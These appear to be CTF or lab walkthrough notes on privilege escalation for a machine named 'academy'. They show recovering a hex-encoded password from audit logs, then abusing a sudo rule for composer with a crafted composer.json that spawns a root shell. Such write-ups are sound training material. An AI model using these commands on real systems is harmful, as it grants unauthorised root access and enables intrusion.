# Privesc

## cry0l1t3

A password encrypted in `hexadecimal` is found in a `log file`.

```bash
$ cat /var/log/audit/* | grep 'comm="su"'
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```

![[Pasted image 20210505151114.png]]

We can connect with this password on the `mrb3n` account.

## mrb3n

`mrb3n` can execute `/usr/bin/composer` as root.

```bash
$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

https://gtfobins.github.io/gtfobins/composer/

![[Pasted image 20210505151402.png]]

## Exploit

```bash
$ TF=$(mktemp -d)
$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
$ sudo /usr/bin/composer --working-dir=$TF run-script x
```

We are `root`.